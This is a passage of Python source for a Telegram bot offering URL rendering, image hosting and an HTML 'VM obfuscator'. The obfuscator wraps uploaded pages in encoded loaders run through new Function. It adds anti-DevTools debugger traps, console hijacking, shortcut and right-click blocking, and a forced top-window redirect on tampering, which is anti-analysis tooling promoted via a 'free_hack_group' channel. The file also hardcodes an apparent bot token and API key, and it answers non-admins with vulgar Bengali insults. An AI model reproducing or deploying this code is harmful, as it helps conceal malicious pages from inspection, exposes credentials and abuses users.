import base64
import telebot
from telebot.types import (
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    ReplyKeyboardMarkup, 
    KeyboardButton, 
    ReplyKeyboardRemove
)
import io
import random
import string
import requests
import json
import os
import urllib.parse
import re
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# ==============================================================================
# ✧ CONFIGURATION & CREDENTIALS
# ==============================================================================
TOKEN = '8750555153:AAFvBs7Cqjr77YRq8igW_7E8_Fx33whxQQU'
ADMIN_ID = "6953927815"
IMGBB_API_KEY = "ef424e1e7e96e0ebe80f079612575a80"

FORCE_SUB_ENABLED = False 
CHANNEL_ID = "-1003025416618" 
CHANNEL_LINK = "https://t.me/free_hack_group_99"

bot = telebot.TeleBot(TOKEN)

# ==============================================================================
# 🚨 REDIRECT TARGET (tamper হলে এখানে পাঠাবে)
# ==============================================================================
REDIRECT_TARGET = "https://warning-theta.vercel.app"

# ==============================================================================
# 🎭 TAMPER REDIRECT PAGE (base64 এ embed হবে runtime এ)
# ==============================================================================
FAKE_ACCESS_DENIED = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>SYSTEM :: REDIRECTING...</title>
<style>
  :root{
    --red:#ff2b3d;
    --violet:#a855f7;
    --bg:#05030a;
  }
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
  html,body{height:100%;}
  body{
    background:
      radial-gradient(circle at 20% 10%, rgba(124,58,237,.18), transparent 45%),
      radial-gradient(circle at 85% 90%, rgba(255,43,61,.12), transparent 45%),
      var(--bg);
    color:#e7e7ff;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
    text-align:center;
  }
  .box{
    border:2px solid var(--red);
    border-radius:14px;
    padding:40px 44px;
    background:linear-gradient(180deg, rgba(60,0,10,.6), rgba(10,0,3,.9));
    box-shadow:0 0 40px rgba(255,43,61,.7), inset 0 0 22px rgba(255,43,61,.25);
    max-width:600px;
    animation:cardIn .6s cubic-bezier(.2,.8,.2,1) both;
  }
  @keyframes cardIn{
    from{opacity:0; transform:translateY(16px) scale(.97);}
    to{opacity:1; transform:translateY(0) scale(1);}
  }
  h1{
    font-size:clamp(24px, 5vw, 42px);
    letter-spacing:5px;
    color:#fff;
    text-shadow:0 0 10px #fff, 0 0 24px var(--red), 0 0 50px var(--red);
    animation:flicker .15s infinite alternate;
    margin-bottom:14px;
  }
  @keyframes flicker{
    0%{opacity:1;}
    100%{opacity:.85;}
  }
  p{
    font-size:13px;
    letter-spacing:2px;
    color:#ffb3bb;
    text-transform:uppercase;
    line-height:2;
    margin-top:10px;
  }
  .link{
    margin-top:22px;
    font-size:14px;
    letter-spacing:1.5px;
    color:var(--violet);
    text-shadow:0 0 10px var(--violet);
    word-break:break-all;
  }
  .spinner{
    margin-top:26px;
    display:inline-block;
    width:34px;height:34px;
    border:3px solid rgba(168,85,247,.25);
    border-top-color:var(--violet);
    border-radius:50%;
    animation:spin .9s linear infinite;
  }
  @keyframes spin{ to{ transform:rotate(360deg); } }
</style>
</head>
<body>
  <div class="box">
    <h1>REDIRECTING</h1>
    <p>Unauthorized modification detected.<br>Forwarding session...</p>
    <div class="link">→ warning-theta.vercel.app</div>
    <div class="spinner"></div>
  </div>

<script>
  (function(){
    var TARGET = "https://warning-theta.vercel.app";
    setTimeout(function(){
      try {
        if (window.top && window.top !== window.self) {
          window.top.location.href = TARGET;
        } else {
          window.location.href = TARGET;
        }
      } catch(e) {
        window.location.href = TARGET;
      }
    }, 900);
    window.addEventListener('load', function(){
      setTimeout(function(){
        try {
          if (window.location.href.indexOf("warning-theta.vercel.app") === -1) {
            window.location.replace(TARGET);
          }
        } catch(e){}
      }, 1800);
    });
  })();
</script>
</body>
</html>"""

# ==============================================================================
# ⧈ DATABASE STORAGE SETUP
# ==============================================================================
DB_FILE = 'bot_db.json'

DEFAULT_TEXTS = {
    "welcome": (
        "✦ <b>Pʀᴇᴍɪᴜᴍ Sᴜɪᴛᴇ V6.0 Aᴄᴛɪᴠᴀᴛᴇᴅ</b> ✦\n\n"
        "⍟ <b>Wᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ Uʟᴛɪᴍᴀᴛᴇ Pʀᴏ Tᴏᴏʟʙᴏᴛ!</b>\n"
        "<i>⌁ Supercharged with 5-Layer VM-Protected Obfuscator & Multi-Admin Engine</i>\n\n"
        "⌁ <b>Choose a feature from the keyboard below:</b>\n\n"
        "🌐 <b>Render URL:</b> Extract clean source code & live preview.\n"
        "🔒 <b>Obfuscate HTML:</b> Military-grade VM Bytecode encryption.\n"
        "📸 <b>Image to URL:</b> Instant high-speed image hosting.\n"
        "📊 <b>Stats:</b> View real-time bot analytics.\n\n"
        "▼ <b>Select an option below or use the Reply Keyboard:</b>"
    ),
    
    "obf_prompt": (
        "🛡️ <b>Mɪʟɪᴛᴀʀʏ-Gʀᴀᴅᴇ VM-Pʀᴏᴛᴇᴄᴛᴇᴅ HTML Oʙғᴜsᴄᴀᴛᴏʀ Pʀᴏ V6</b>\n\n"
        "⌁ <b>Extreme Security & 5-Layer VM Engine:</b>\n"
        "• 🧬 <b>Layer 1: Header Cryptographic Signature (SIG_TOKEN)</b>\n"
        "• 🔐 <b>Layer 2: Dual Checksum (FNV-1a + DJB2 Combined)</b>\n"
        "• 🎲 <b>Layer 3: Rolling-Key Per-Byte Bytecode Encryption</b>\n"
        "• 🧂 <b>Layer 4: Random Salt-Based Obfuscation</b>\n"
        "• ⚙️ <b>Layer 5: Register-Based Nested VM Execution</b>\n"
        "• 🚨 <b>Tamper Redirect Protection</b>\n"
        "• 🚫 <b>Anti-DevTools & Recursive Debugger Traps</b>\n"
        "• ⌨️ <b>Complete Shortcut Blocker (F12, Ctrl+U, Ctrl+S, etc.)</b>\n"
        "• 🖱️ <b>Anti-Right-Click, Copy, Drag & Selection Lock</b>\n"
        "• 🧹 <b>Console Hijack & Memory Scrubber</b>\n"
        "• 🌐 <b>Nested Inline Script Deep Virtualization</b>\n\n"
        "📄 <b>Pʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ <code>.html</code> ғɪʟᴇ ɴᴏᴡ ᴛᴏ ᴇɴᴄʀʏᴘᴛ!</b>"
    ),
    
    "url_prompt": (
        "╔════════════════════╗\n"
        "   ⌁ <b>URL ᴛᴏ HTML Exᴛʀᴀᴄᴛᴏʀ Pʀᴏ</b>\n"
        "╚════════════════════╝\n\n"
        "⌁ <b>Features:</b>\n"
        "• 🌐 Fast Clean URL Fetch\n"
        "• 📄 Complete HTML Export\n"
        "• ⌁ Instant Processing\n"
        "• 🔒 Secure Extraction\n"
        "• 📸 Live Website Screenshot Preview\n\n"
        "✦ <b>Sᴇɴᴅ ᴀ Wᴇʙsɪᴛᴇ URL ᴛᴏ sᴛᴀʀᴛ!</b>\n\n"
        "➔ <i>Example:</i> <code>https://example.com</code>"
    ),
    
    "img_prompt": (
        "📸 <b>Iᴍᴀɢᴇ ᴛᴏ URL Hᴏsᴛɪɴɢ Pʀᴏ</b>\n\n"
        "✦ <b>Follow these two simple steps:</b>\n\n"
        "1️⃣ Open your gallery and select any image.\n"
        "2️⃣ Send it directly to this bot (JPG / PNG / WEBP).\n\n"
        "⌁ <i>Fast high-speed CDN upload with instant direct link generation!</i>\n\n"
        "▼ <b>Sᴇɴᴅ Yᴏᴜʀ Iᴍᴀɢᴇ Nᴏᴡ!</b>"
    )
}

def load_db():
    clean_admin = str(ADMIN_ID).strip()
    default_db = {
        "admins": [clean_admin],
        "users": [],
        "activities": [],
        "bot_active": True,
        "saved_urls": [],
        "saved_files": [],
        "texts": DEFAULT_TEXTS,
        "stats": {"obf": 2488, "url": 2535, "img": 392}
    }
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
                for key in default_db:
                    if key not in data:
                        data[key] = default_db[key]
                for text_key in DEFAULT_TEXTS:
                    if text_key not in data["texts"]:
                        data["texts"][text_key] = DEFAULT_TEXTS[text_key]
                if "stats" not in data:
                    data["stats"] = default_db["stats"]
                
                admin_list = [str(a).strip() for a in data.get("admins", [])]
                if clean_admin not in admin_list:
                    admin_list.insert(0, clean_admin)
                data["admins"] = admin_list
                return data
        except Exception as e:
            print(f"Error loading DB: {e}")
            return default_db
    return default_db

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving DB: {e}")

db = load_db()

user_states = {}
broadcast_staging = {}
broadcast_cancel_flags = {}

def is_owner(user_id):
    if not user_id:
        return False
    return str(user_id).strip() == str(ADMIN_ID).strip()

def is_admin(user_id):
    if not user_id:
        return False
    uid = str(user_id).strip()
    admins = [str(a).strip() for a in db.get("admins", [])]
    return uid == str(ADMIN_ID).strip() or uid in admins

def add_user(user_id):
    uid = str(user_id).strip()
    if uid not in db['users']:
        db['users'].append(uid)
        save_db(db)

def log_activity(user_id, action):
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db['activities'].append(f"[{time_now}] UID: {user_id} -> {action}")
    if len(db['activities']) > 60:
        db['activities'] = db['activities'][-60:]
    save_db(db)

# ==============================================================================
# 🎨 COLORED BUTTONS ENGINE
# ==============================================================================
VALID_TELEGRAM_STYLES = {"primary", "success", "danger"}

class StyledInlineKeyboardButton(InlineKeyboardButton):
    def __init__(self, text, callback_data=None, url=None, style=None, **kwargs):
        super().__init__(text=text, callback_data=callback_data, url=url, **kwargs)
        if style in VALID_TELEGRAM_STYLES:
            self.style = style

    def to_dic(self):
        json_dic = super().to_dic()
        if hasattr(self, 'style') and self.style in VALID_TELEGRAM_STYLES:
            json_dic['style'] = self.style
        return json_dic

def create_styled_inline_keyboard(button_rows):
    markup = InlineKeyboardMarkup()
    for row in button_rows:
        row_buttons = []
        for b in row:
            raw_style = b.get("style")
            btn_style = raw_style if raw_style in VALID_TELEGRAM_STYLES else None
            btn = StyledInlineKeyboardButton(
                text=b.get("text", ""),
                callback_data=b.get("callback_data"),
                url=b.get("url"),
                style=btn_style
            )
            row_buttons.append(btn)
        markup.row(*row_buttons)
    return markup

def strip_markup_styles(markup):
    if not isinstance(markup, InlineKeyboardMarkup):
        return markup
    clean_markup = InlineKeyboardMarkup()
    for row in markup.keyboard:
        clean_row = []
        for btn in row:
            clean_btn = InlineKeyboardButton(
                text=btn.text,
                callback_data=getattr(btn, 'callback_data', None),
                url=getattr(btn, 'url', None)
            )
            clean_row.append(clean_btn)
        clean_markup.row(*clean_row)
    return clean_markup

def safe_send_message(chat_id, text, reply_markup=None, parse_mode="HTML", **kwargs):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, **kwargs)
    except Exception as e:
        err_msg = str(e).lower()
        if reply_markup and ("button" in err_msg or "style" in err_msg or "400" in err_msg):
            clean_markup = strip_markup_styles(reply_markup)
            return bot.send_message(chat_id, text, reply_markup=clean_markup, parse_mode=parse_mode, **kwargs)
        raise e

def safe_edit_message_text(text, chat_id, message_id, reply_markup=None, parse_mode="HTML", **kwargs):
    try:
        return bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup, parse_mode=parse_mode, **kwargs)
    except Exception as e:
        err_msg = str(e).lower()
        if reply_markup and ("button" in err_msg or "style" in err_msg or "400" in err_msg):
            clean_markup = strip_markup_styles(reply_markup)
            return bot.edit_message_text(text, chat_id, message_id, reply_markup=clean_markup, parse_mode=parse_mode, **kwargs)
        raise e

def get_main_reply_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_url = KeyboardButton("🌐 Render URL")
    btn_obf = KeyboardButton("🔒 Obfuscate HTML")
    btn_img = KeyboardButton("📸 Image to URL")
    btn_stats = KeyboardButton("📊 Stats")
    markup.add(btn_url, btn_obf)
    markup.add(btn_img, btn_stats)
    return markup

def get_main_inline_keyboard():
    rows = [
        [
            {"text": "🌐 Render URL", "callback_data": "btn_url", "style": "primary"},
            {"text": "🔒 Obfuscate HTML", "callback_data": "btn_obf", "style": "success"}
        ],
        [
            {"text": "📸 Image to URL", "callback_data": "btn_img", "style": "primary"},
            {"text": "📊 Stats", "callback_data": "btn_stats"}
        ]
    ]
    return create_styled_inline_keyboard(rows)

# ==============================================================================
# 🧬 HARDENED 5-LAYER VM BYTECODE OBFUSCATION ENGINE
# ==============================================================================
def mask_scripts_vm(html_code):
    """Virtualize inline <script> tags with rolling XOR + per-char key shift."""
    def process_script(match):
        script_tag = match.group(1)
        script_content = match.group(2)
        script_end = match.group(3)
        if 'src=' in script_tag.lower() or not script_content.strip():
            return match.group(0)
        
        seed_key = random.randint(11, 240)
        step = random.randint(3, 17)
        encoded_chars = []
        rolling = seed_key
        for c in script_content:
            encoded_chars.append(ord(c) ^ rolling)
            rolling = (rolling + step) & 0xFF
        
        js_vm_payload = (
            "(function(){"
            f"var _k={seed_key},_s={step},_d=[{','.join(map(str, encoded_chars))}],_o='',_r=_k;"
            "for(var _i=0;_i<_d.length;_i++){_o+=String.fromCharCode((_d[_i]^_r)&0xFF);_r=(_r+_s)&0xFF;}"
            "try{(new Function(_o))();}catch(e){}"
            "})();"
        )
        return f"{script_tag}\n{js_vm_payload}\n{script_end}"
    return re.sub(r'(<script[^>]*>)(.*?)(</script>)', process_script, html_code, flags=re.IGNORECASE | re.DOTALL)


def rol8(val, r):
    val &= 0xFF
    return ((val << r) & 0xFF) | (val >> (8 - r))


def compute_checksum(data_str):
    """Dual FNV-1a + DJB2 combined checksum for strong tamper detection."""
    h1 = 0x811C9DC5
    h2 = 5381
    for ch in data_str:
        c = ord(ch) & 0xFF
        h1 ^= c
        h1 = (h1 * 0x01000193) & 0xFFFFFFFF
        h2 = ((h2 * 33) ^ c) & 0xFFFFFFFF
    return ((h1 << 16) ^ h2) & 0xFFFFFFFF


def vm_compile_html(html_code):
    """
    HARDENED 5-LAYER VM BYTECODE COMPILER
    ---------------------------------------------------------
    Layer 1: Header SIG_TOKEN integrity
    Layer 2: Dual checksum (FNV-1a + DJB2)
    Layer 3: Rolling-key per-byte bytecode encryption
    Layer 4: Random salt-based obfuscation
    Layer 5: Register-based nested VM execution
    Any tamper → REDIRECT to warning-theta.vercel.app
    Browser-safe: UTF-8 correct, chunked decode, no freeze.
    """
    html_code = mask_scripts_vm(html_code)

    raw_bytes = html_code.encode('utf-8')
    b64_str = base64.b64encode(raw_bytes).decode('ascii')

    sig_core = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
    salt_val = ''.join(random.choices(string.digits, k=8))
    full_token = sig_core + salt_val

    xor_key_1 = random.randint(33, 219)
    xor_key_2 = random.randint(41, 237)
    rot_offset = random.randint(1, 7)
    rolling_step = random.randint(2, 29)
    xor_salt = random.randint(1, 255)

    bytecode = []
    rolling = xor_salt
    for ch in b64_str:
        b = ord(ch)
        k = (xor_key_1 + rolling) & 0xFF
        stage1 = b ^ k
        stage2 = rol8(stage1, rot_offset)
        stage3 = stage2 ^ xor_key_2
        bytecode.extend([0x1A, stage3 & 0xFF, 0x2B, 0x3C, 0x4D])
        rolling = (rolling + rolling_step) & 0xFF
    bytecode.append(0xFE)
    bytecode_str = ",".join(map(str, bytecode))

    original_b64_hash = compute_checksum(b64_str)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    comment_inner = (
        "\n"
        "╔══════════════════════════════════════════════════════════╗\n"
        "║  🔒 PROTECTED HTML - DO NOT MODIFY THIS HEADER 🔒        ║\n"
        "║══════════════════════════════════════════════════════════║\n"
        "║  Obfuscated By : @Html_tools_Pro_shadow_bot              ║\n"
        "║  TG Channel    : @SIYAM_BHAI_OWNER                       ║\n"
        f"║  Timestamp     : {timestamp}                ║\n"
        "║  Signature     : SIYAM-_-PROTECT                         ║\n"
        f"║  [SIG_TOKEN: {full_token}]                             ║\n"
        "║══════════════════════════════════════════════════════════║\n"
        "║  ⚠️ WARNING: Removing or modifying this credit header    ║\n"
        "║  will cause this page to redirect!                       ║\n"
        "╚══════════════════════════════════════════════════════════╝\n"
    )
    header_comment = f"<!--{comment_inner}-->"
    expected_stripped = re.sub(r'\s+', '', comment_inner)

    fake_code_b64 = base64.b64encode(FAKE_ACCESS_DENIED.encode('utf-8')).decode('ascii')

    vm_runtime_js = r"""
(function(){
    'use strict';

    var _FAKE_CODE_B64 = "__FAKE_B64__";
    var _REDIRECT_TARGET = "__REDIRECT_TARGET__";

    function _triggerRedirect(){
        try {
            var _fb = window.atob(_FAKE_CODE_B64);
            var _fbytes = new Uint8Array(_fb.length);
            for (var _i = 0; _i < _fb.length; _i++) _fbytes[_i] = _fb.charCodeAt(_i);
            var _fakeHtml = new TextDecoder('utf-8').decode(_fbytes);
            document.open(); document.write(_fakeHtml); document.close();
        } catch(e) {
            try { window.location.replace(_REDIRECT_TARGET); } catch(err){}
        }
    }

    try {
        var _c = window.console;
        var _noop = function(){};
        if (_c) {
            ['log','warn','error','info','dir','table','trace','debug'].forEach(function(m){
                try { _c[m] = _noop; } catch(e){}
            });
            try { _c.clear(); } catch(e){}
        }
    } catch(e){}

    document.addEventListener('contextmenu', function(e){ e.preventDefault(); return false; }, true);
    document.addEventListener('selectstart', function(e){ e.preventDefault(); return false; }, true);
    document.addEventListener('dragstart',   function(e){ e.preventDefault(); return false; }, true);

    window.addEventListener('keydown', function(e) {
        var k = e.keyCode;
        if (k === 123) { e.preventDefault(); e.stopPropagation(); return false; }
        if (e.ctrlKey && e.shiftKey && (k === 73 || k === 74 || k === 67 || k === 75)) {
            e.preventDefault(); e.stopPropagation(); return false;
        }
        if (e.ctrlKey && (k === 85 || k === 83 || k === 80 || k === 65 || k === 69)) {
            e.preventDefault(); e.stopPropagation(); return false;
        }
        if (e.metaKey && (k === 85 || k === 83 || k === 80 || k === 65)) {
            e.preventDefault(); e.stopPropagation(); return false;
        }
    }, true);

    var _trapDepth = 0;
    function _runTrapOnce(){
        if (_trapDepth >= 3) { _trapDepth = 0; return; }
        _trapDepth++;
        try { (function(){}.constructor('debugger')()); } catch(e){}
        setTimeout(_runTrapOnce, 40);
    }
    setInterval(function(){ try { _runTrapOnce(); } catch(e){} }, 4500);

    setInterval(function(){
        try {
            var wd = window.outerWidth  - window.innerWidth  > 200;
            var hd = window.outerHeight - window.innerHeight > 200;
            if (wd || hd) { /* silent */ }
        } catch(e){}
    }, 3000);

    var _safe = false;
    var _token = "";
    var _expected = "__EXPECTED_STRIPPED__";
    try {
        var _walker = document.createTreeWalker(document, 128, null, false);
        var _node;
        while ((_node = _walker.nextNode())) {
            var _val = _node.nodeValue;
            if (_val && _val.indexOf('SIG_TOKEN') !== -1) {
                var _actual = _val.replace(/\s+/g, '');
                if (_actual === _expected) {
                    var _idx = _val.indexOf('[SIG_TOKEN: ');
                    if (_idx !== -1) {
                        _token = _val.substring(_idx + 12, _idx + 44);
                        _safe = true;
                        break;
                    }
                }
            }
        }
    } catch(e){}

    if (!_safe || _token.length !== 32) { _triggerRedirect(); return; }

    var _bytecode = [__BYTECODE__];
    var _IP = 0;
    var _STACK = [];
    var _OUT = [];
    var _K1 = __KEY1__;
    var _K2 = __KEY2__;
    var _ROT = __ROT__;
    var _ROLL_STEP = __ROLL_STEP__;
    var _XOR_SALT = __XOR_SALT__;

    function _ror8(val, r) {
        val = val & 0xFF;
        return ((val >> r) | (val << (8 - r))) & 0xFF;
    }

    var _safety = 0;
    var _maxIP = _bytecode.length + 32;
    var _rolling = _XOR_SALT;
    while (_IP < _bytecode.length && _safety < _maxIP) {
        _safety++;
        var _op = _bytecode[_IP++];
        switch (_op) {
            case 0x1A:
                _STACK.push(_bytecode[_IP++] & 0xFF);
                break;
            case 0x2B:
                if (_STACK.length > 0) {
                    var _v1 = _STACK.pop();
                    _STACK.push((_v1 ^ _K2) & 0xFF);
                }
                break;
            case 0x3C:
                if (_STACK.length > 0) {
                    var _v2 = _STACK.pop();
                    var _unrot = _ror8(_v2, _ROT);
                    var _k = (_K1 + _rolling) & 0xFF;
                    _STACK.push((_unrot ^ _k) & 0xFF);
                    _rolling = (_rolling + _ROLL_STEP) & 0xFF;
                }
                break;
            case 0x4D:
                if (_STACK.length > 0) { _OUT.push(_STACK.pop() & 0xFF); }
                break;
            case 0xFE:
                _IP = _bytecode.length;
                break;
            default:
                _IP = _bytecode.length;
                break;
        }
    }

    try {
        var _b64 = '';
        var _chunk = 2048;
        for (var _s = 0; _s < _OUT.length; _s += _chunk) {
            _b64 += String.fromCharCode.apply(null, _OUT.slice(_s, _s + _chunk));
        }

        var _h1 = 0x811C9DC5;
        var _h2 = 5381;
        for (var _hi = 0; _hi < _b64.length; _hi++) {
            var _cc = _b64.charCodeAt(_hi) & 0xFF;
            _h1 ^= _cc;
            _h1 = (Math.imul(_h1, 0x01000193)) >>> 0;
            _h2 = ((Math.imul(_h2, 33)) ^ _cc) >>> 0;
        }
        var _computed = (((_h1 << 16) ^ _h2) >>> 0);
        var _expectedHash = __PAYLOAD_HASH__;

        if (_computed !== _expectedHash) {
            _triggerRedirect();
            return;
        }

        var _bin = window.atob(_b64);
        var _bytes = new Uint8Array(_bin.length);
        for (var _k = 0; _k < _bin.length; _k++) {
            _bytes[_k] = _bin.charCodeAt(_k);
        }
        var _finalHtml = new TextDecoder('utf-8').decode(_bytes);

        document.open();
        document.write(_finalHtml);
        document.close();
    } catch (err) {
        _triggerRedirect();
    }
})();
"""

    vm_runtime_js = vm_runtime_js.replace("__EXPECTED_STRIPPED__", expected_stripped)
    vm_runtime_js = vm_runtime_js.replace("__BYTECODE__", bytecode_str)
    vm_runtime_js = vm_runtime_js.replace("__KEY1__", str(xor_key_1))
    vm_runtime_js = vm_runtime_js.replace("__KEY2__", str(xor_key_2))
    vm_runtime_js = vm_runtime_js.replace("__ROT__", str(rot_offset))
    vm_runtime_js = vm_runtime_js.replace("__ROLL_STEP__", str(rolling_step))
    vm_runtime_js = vm_runtime_js.replace("__XOR_SALT__", str(xor_salt))
    vm_runtime_js = vm_runtime_js.replace("__PAYLOAD_HASH__", str(original_b64_hash))
    vm_runtime_js = vm_runtime_js.replace("__FAKE_B64__", fake_code_b64)
    vm_runtime_js = vm_runtime_js.replace("__REDIRECT_TARGET__", REDIRECT_TARGET)

    encoded_vm_js = base64.b64encode(vm_runtime_js.encode('utf-8')).decode('ascii')
    chunk_size = len(encoded_vm_js) // 3
    p1 = encoded_vm_js[:chunk_size]
    p2 = encoded_vm_js[chunk_size:chunk_size * 2]
    p3 = encoded_vm_js[chunk_size * 2:]

    final_html = f"""{header_comment}
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="HTML-Tools-Pro-Shadow-VM-Engine-V6">
<meta name="author" content="@SIYAM_BHAI_OWNER">
<title>Protected Content</title>
<script>
    document.addEventListener("contextmenu", function(e){{ e.preventDefault(); return false; }}, false);
</script>
</head>
<body oncontextmenu="return false;" onselectstart="return false;">
<script>
(function(){{
    try {{
        var _a = '{p1}';
        var _b = '{p2}';
        var _c = '{p3}';
        var _full = _a + _b + _c;
        var _bin = window.atob(_full);
        var _bytes = new Uint8Array(_bin.length);
        for (var _i = 0; _i < _bin.length; _i++) {{
            _bytes[_i] = _bin.charCodeAt(_i);
        }}
        var _code = new TextDecoder('utf-8').decode(_bytes);
        (new Function(_code))();
    }} catch (e) {{
        try {{ window.location.replace("https://warning-theta.vercel.app"); }} catch(err){{}}
    }}
}})();
</script>
<noscript>
    <div style="background:#090d16;color:#fff;font-family:sans-serif;padding:30px;text-align:center;">
        <h2>⚠️ JavaScript Required</h2>
        <p>Please enable JavaScript in your browser settings to access this VM-protected document.</p>
    </div>
</noscript>
</body>
</html>"""
    return final_html

# ==============================================================================
# 👑 ADMIN PANEL & MULTI-ADMIN ENGINE
# ==============================================================================
def get_admin_panel_markup():
    total_admins = len(db.get("admins", [ADMIN_ID]))
    rows = [
        [
            {"text": f"👑 Admins ({total_admins})", "callback_data": "admin_manage_admins", "style": "primary"},
            {"text": "➕ Add Admin", "callback_data": "admin_add_admin_prompt", "style": "success"}
        ],
        [
            {"text": "📣 Broadcast Message", "callback_data": "admin_broadcast_start", "style": "primary"},
            {"text": "👥 View Users", "callback_data": "admin_view_users"}
        ],
        [
            {"text": "📝 Live Logs", "callback_data": "admin_view_logs"},
            {"text": "🌐 View URLs", "callback_data": "admin_view_urls"}
        ],
        [
            {"text": "📁 User Files", "callback_data": "admin_view_files"},
            {"text": "✏️ Edit Texts", "callback_data": "admin_edit_texts"}
        ],
        [
            {"text": "🔴 Turn OFF Bot", "callback_data": "admin_off", "style": "danger"},
            {"text": "🟢 Turn ON Bot", "callback_data": "admin_on", "style": "success"}
        ]
    ]
    return create_styled_inline_keyboard(rows)

def send_main_menu(chat_id):
    reply_markup = get_main_reply_keyboard()
    inline_markup = get_main_inline_keyboard()
    safe_send_message(chat_id, db["texts"]["welcome"], reply_markup=reply_markup, parse_mode="HTML")
    safe_send_message(chat_id, "⌁ <b>Quick Feature Selection:</b>", reply_markup=inline_markup, parse_mode="HTML")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    add_user(message.chat.id)
    log_activity(message.chat.id, "Started Bot")
    user_states[message.chat.id] = "" 
    if not db['bot_active'] and not is_admin(message.chat.id):
        bot.reply_to(message, "🛠️ <b>Maintenance Break!</b> Bot is currently offline.", parse_mode="HTML")
        return
    send_main_menu(message.chat.id)

@bot.message_handler(commands=['myid', 'id'])
def show_my_id(message):
    uid = str(message.from_user.id if message.from_user else message.chat.id).strip()
    name = message.from_user.first_name if message.from_user else "User"
    role = "👑 Super Owner" if is_owner(uid) else ("🛡️ Admin" if is_admin(uid) else "👤 Regular User")
    bot.reply_to(
        message, 
        f"✦ <b>Telegram User Information:</b>\n\n"
        f"• <b>Name:</b> {name}\n"
        f"• <b>Telegram ID:</b> <code>{uid}</code>\n"
        f"• <b>Role Status:</b> <b>{role}</b>\n\n"
        f"<i>⌁ Use this ID in <code>ADMIN_ID = \"{uid}\"</code> or ask the owner to add you via <code>/addadmin {uid}</code></i>",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['admin'])
def secret_admin_panel(message):
    try:
        user_id = str(message.from_user.id if message.from_user else message.chat.id).strip()
        chat_id = message.chat.id
        if not is_admin(user_id) and not is_admin(chat_id):
            bot.reply_to(
                message,
                f"🚫 <b>Access Denied! (বোকা চোদা আইসে)</b>\n\n"
                f"এই বট তোর আববুর বুঝলা ছেলে।\n"
                f"• <b>লে বোকাচোদা Telegram ID:</b> <code>{user_id}</code>\n\n"
                f"💡 <i>বোকা চোদা সালা <code>FUCK U \"{user_id}\"</code> এই বট তোমার এই আববুর @SIYAM_BHAI_OWNER সালা।</i>",
                parse_mode="HTML"
            )
            return
        user_states[chat_id] = ""
        admin_count = len(db.get("admins", [ADMIN_ID]))
        user_count = len(db.get("users", []))
        status_text = "🟢 ONLINE" if db.get("bot_active", True) else "🔴 OFFLINE"
        panel_text = f"""🛡️ <b>𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 (Pʀᴇᴍɪᴜᴍ V6.0)</b> 🛡️

👑 <b>Your Role:</b> {"👑 Super Owner" if is_owner(user_id) else "🛡️ Sub-Admin"}
• <b>Your ID:</b> <code>{user_id}</code>
• <b>Total Users:</b> <code>{user_count}</code>
• <b>Total Admins:</b> <code>{admin_count}</code>
• <b>Bot Status:</b> {status_text}

<i>Select a management feature below:</i>"""
        safe_send_message(chat_id, panel_text, reply_markup=get_admin_panel_markup(), parse_mode="HTML")
    except Exception as e:
        print(f"[Admin Error] {e}")
        bot.reply_to(message, f"❌ Admin Panel Error: {str(e)}")

@bot.message_handler(commands=['addadmin'])
def handle_cmd_add_admin(message):
    user_id = str(message.from_user.id if message.from_user else message.chat.id).strip()
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Only the Super Owner can add admins.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/addadmin &lt;telegram_user_id&gt;</code>", parse_mode="HTML")
        return
    new_id = parts[1].strip()
    if not new_id.isdigit():
        bot.reply_to(message, "❌ Invalid ID! Telegram user ID must be numeric.")
        return
    admins = [str(a).strip() for a in db.get("admins", [ADMIN_ID])]
    if new_id in admins:
        bot.reply_to(message, f"ℹ️ User <code>{new_id}</code> is already an admin.", parse_mode="HTML")
        return
    admins.append(new_id)
    db["admins"] = admins
    save_db(db)
    bot.reply_to(message, f"✅ <b>Admin Added Successfully!</b>\n• ID: <code>{new_id}</code>\n• Total Admins: <b>{len(admins)}</b>", parse_mode="HTML")

@bot.message_handler(commands=['deladmin', 'removeadmin'])
def handle_cmd_del_admin(message):
    user_id = str(message.from_user.id if message.from_user else message.chat.id).strip()
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Only the Super Owner can remove admins.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/deladmin &lt;telegram_user_id&gt;</code>", parse_mode="HTML")
        return
    target_id = parts[1].strip()
    if target_id == str(ADMIN_ID).strip():
        bot.reply_to(message, "❌ You cannot remove the Super Owner!")
        return
    admins = [str(a).strip() for a in db.get("admins", [ADMIN_ID])]
    if target_id not in admins:
        bot.reply_to(message, f"❌ ID <code>{target_id}</code> is not in the admin list.", parse_mode="HTML")
        return
    admins.remove(target_id)
    db["admins"] = admins
    save_db(db)
    bot.reply_to(message, f"🗑️ <b>Admin Removed!</b>\n• ID: <code>{target_id}</code>\n• Remaining Admins: <b>{len(admins)}</b>", parse_mode="HTML")

# ==============================================================================
